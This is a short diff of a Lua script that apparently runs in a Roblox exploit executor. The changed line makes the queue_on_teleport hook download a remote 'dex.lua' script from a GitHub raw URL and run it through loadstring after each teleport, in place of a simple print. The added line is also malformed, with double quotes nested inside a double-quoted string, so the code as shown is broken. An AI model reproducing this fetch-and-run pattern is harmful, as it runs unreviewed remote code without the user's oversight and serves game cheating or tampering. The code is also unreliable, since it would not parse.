@@ -18,7 +18,7 @@ print("I HAVE SURVIVED")
 lp.OnTeleport:Connect(function(state)
     if not TeleportFlag and queue_on_teleport then
         TeleportFlag = true
-        queue_on_teleport("print('I HAVE SURVIVED')")
+        queue_on_teleport("loadstring(game:HttpGet("https://raw.githubusercontent.com/gaoray08/meow/refs/heads/main/dex.lua"))")
     end
 end)
 
